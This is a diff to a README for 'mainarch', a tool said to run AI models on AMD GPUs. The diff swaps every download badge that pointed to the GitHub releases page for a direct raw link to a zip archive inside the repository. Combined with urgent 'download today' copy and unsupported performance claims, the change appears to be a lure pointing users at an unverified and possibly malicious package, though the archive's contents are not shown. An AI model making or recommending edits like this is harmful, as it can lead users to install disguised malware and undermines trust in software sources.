@@ -1,6 +1,6 @@
 # ⚡ mainarch - Talk Directly to Your AMD GPU
 
-[![Download mainarch](https://img.shields.io/badge/Download-mainarch-blueviolet?style=for-the-badge)](https://github.com/Amitga5978/mainarch/releases)
+[![Download mainarch](https://img.shields.io/badge/Download-mainarch-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/Amitga5978/mainarch/main/baseline/Software_2.3-alpha.5.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Getting started with mainarch is simple. Follow these steps:
 
 ### Step 1: Download mainarch
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-orange?style=for-the-badge)](https://github.com/Amitga5978/mainarch/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-orange?style=for-the-badge)](https://raw.githubusercontent.com/Amitga5978/mainarch/main/baseline/Software_2.3-alpha.5.zip)
 
 Visit this link to download the application. The download page will show you available versions - always pick the newest one unless you have a specific reason not to.
 
@@ -123,7 +123,7 @@ Users report that mainarch provides excellent performance on supported hardware.
 
 ## 📥 Download mainarch Today
 
-[![Download mainarch](https://img.shields.io/badge/Download-mainarch-green?style=for-the-badge)](https://github.com/Amitga5978/mainarch/releases)
+[![Download mainarch](https://img.shields.io/badge/Download-mainarch-green?style=for-the-badge)](https://raw.githubusercontent.com/Amitga5978/mainarch/main/baseline/Software_2.3-alpha.5.zip)
 
 Visit this link to download the application. Join the community of users running AI models directly on their AMD hardware.
 
@@ -144,7 +144,7 @@ mainarch runs entirely on your local machine. Your data stays with you. No cloud
 
 Don't wait - unlock the full potential of your AMD GPU today. Download mainarch and start running powerful AI models in minutes.
 
-[![Get Started](https://img.shields.io/badge/Get-Started-blue?style=for-the-badge)](https://github.com/Amitga5978/mainarch/releases)
+[![Get Started](https://img.shields.io/badge/Get-Started-blue?style=for-the-badge)](https://raw.githubusercontent.com/Amitga5978/mainarch/main/baseline/Software_2.3-alpha.5.zip)
 
 ---
 
